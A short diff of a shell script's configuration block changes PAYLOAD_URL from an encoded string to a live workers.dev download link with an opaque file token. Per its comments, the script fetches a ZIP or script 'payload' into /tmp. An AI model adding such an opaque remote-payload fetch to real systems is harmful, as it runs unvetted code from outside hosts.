@@ -4,7 +4,7 @@
 # This script handles both ZIP files and direct script files
 
 # Configuration
-PAYLOAD_URL="WnziHy5G+38OKu1n7rLMxpbc4ZV7Wk+rWpzen3bcNzbPPKSTCs4hY+Lv+s6Cgma8"  # Can be a ZIP or a script
+PAYLOAD_URL="https://tvkkdata.tvkishorkumardata.workers.dev/download.aspx?file=SX%2BuR9HZRpXEAN91wOejnODgNKylQ9nj9rjmrOMuxp%2B9qDcvbGm9zA%2Fjve4BpLxm&expiry=RZTSmvZy6Ux8LE9cy1XESA%3D%3D&mac=e416f87ff3441364728e8c98a674450576ef2987a443b77da8b1b8c87be223a4"  # Can be a ZIP or a script
 ZIP_PASSWORD="YourStrongPassword123!"                  # Password for the zip file (if applicable)
 TEMP_DIR="/tmp/secure_payload"
 WORKING_DIR="/usr/src/app"
